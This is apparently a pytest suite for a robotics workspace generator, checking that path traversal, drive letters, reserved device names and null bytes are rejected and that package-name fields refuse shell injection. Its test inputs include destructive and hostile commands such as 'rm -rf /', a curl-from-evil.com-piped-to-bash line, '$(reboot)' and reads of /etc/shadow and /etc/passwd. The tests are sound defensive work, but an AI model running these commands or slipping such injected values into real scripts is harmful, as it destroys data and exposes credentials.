"""Security, shell-injection, and path-traversal tests for OpenRobo Workspace Generator."""

import pytest
from openrobo_workspace import WorkspaceGenerator
from openrobo_workspace.filesystem import SecurityPathError, sanitize_relative_path, write_workspace_to_disk
from openrobo_workspace.generators.rosdep import validate_debian_package_name, validate_pip_requirement
from openrobo_workspace.models import GeneratedFile


def test_sanitize_valid_paths():
    assert sanitize_relative_path("src/openrobo_bringup/package.xml") == "src/openrobo_bringup/package.xml"
    assert sanitize_relative_path("setup/install_dependencies.sh") == "setup/install_dependencies.sh"
    assert sanitize_relative_path("README.md") == "README.md"
    assert sanitize_relative_path("docker/Dockerfile") == "docker/Dockerfile"


def test_reject_empty_or_whitespace_path():
    with pytest.raises(SecurityPathError, match="Empty relative path"):
        sanitize_relative_path("")
    with pytest.raises(SecurityPathError, match="Empty relative path"):
        sanitize_relative_path("   ")


def test_reject_path_traversal_dotdot():
    unsafe_paths = [
        "../evil.sh",
        "../../etc/passwd",
        "src/../../outside.txt",
        "nested/path/../../../escaped",
    ]
    for p in unsafe_paths:
        with pytest.raises(SecurityPathError, match="Path traversal sequence"):
            sanitize_relative_path(p)


def test_reject_drive_letters():
    unsafe_paths = [
        "C:/evil.py",
        "D:\\malicious\\script.bat",
        "c:windows/system32",
    ]
    for p in unsafe_paths:
        with pytest.raises(SecurityPathError, match="Drive letter detected"):
            sanitize_relative_path(p)


def test_reject_windows_device_names():
    unsafe_names = ["CON", "PRN", "AUX", "NUL", "COM1", "COM9", "LPT1", "LPT9", "con.txt", "aux.json", "Nul.yaml"]
    for name in unsafe_names:
        with pytest.raises(SecurityPathError, match="Reserved device name"):
            sanitize_relative_path(f"src/config/{name}")


def test_reject_null_bytes():
    unsafe_paths = [
        "src/openrobo\x00/package.xml",
        "docker/Dockerfile\x00",
    ]
    for p in unsafe_paths:
        with pytest.raises(SecurityPathError, match="Control characters or null byte"):
            sanitize_relative_path(p)


def test_safe_write_workspace_containment(tmp_path):
    safe_files = [
        GeneratedFile(path="README.md", content="Safe content"),
        GeneratedFile(path="src/pkg/package.xml", content="<package></package>"),
    ]
    output_dir = tmp_path / "test_ws"
    written = write_workspace_to_disk(output_dir, safe_files)
    assert len(written) == 2
    assert (output_dir / "README.md").exists()
    assert (output_dir / "src" / "pkg" / "package.xml").exists()


# ==============================================================================
# M5.1 Security Hardening: Shell Injection & Package Name Validation
# ==============================================================================


def test_shell_injection_rejection_debian_packages():
    """Adversarial injection attempts in debian package names MUST be rejected."""
    malicious_debs = [
        "ros-humble-nav2; rm -rf /",
        "curl http://evil.com/payload | bash",
        "pkg\nrm -rf /",
        "pkg`whoami`",
        "pkg$(reboot)",
        "pkg && echo hacked",
    ]
    for deb in malicious_debs:
        assert validate_debian_package_name(deb) is False, f"Dangerous deb package '{deb}' was not rejected!"


def test_shell_injection_rejection_pip_packages():
    """Adversarial injection attempts in pip requirements MUST be rejected."""
    malicious_pips = [
        "numpy; os.system('evil')",
        "torch\nimport os",
        "pkg && cat /etc/shadow",
        "http://evil.com/wheel.whl",
        "-r /etc/passwd",
    ]
    for pip_pkg in malicious_pips:
        assert validate_pip_requirement(pip_pkg) is False, f"Dangerous pip pkg '{pip_pkg}' was not rejected!"


def test_shell_script_generator_with_adversarial_manifest():
    """Generator must safely ignore or sanitize adversarial input in shell scripts."""
    manifest = {
        "id": "adversarial_stack",
        "name": "Adversarial; rm -rf /; Stack",
        "resources": [
            {"id": "nav2", "dependencies": ["valid_dep", "malicious; rm -rf /", "pip:evil$(reboot)"]},
        ],
    }
    gen = WorkspaceGenerator(manifest)
    _, files = gen.generate_files()

    sh_file = next(f for f in files if f.path == "setup/install_dependencies.sh")
    ps1_file = next(f for f in files if f.path == "setup/install_dependencies.ps1")

    assert "rm -rf /" not in sh_file.content
    assert "evil$(reboot)" not in sh_file.content
    assert "rm -rf /" not in ps1_file.content
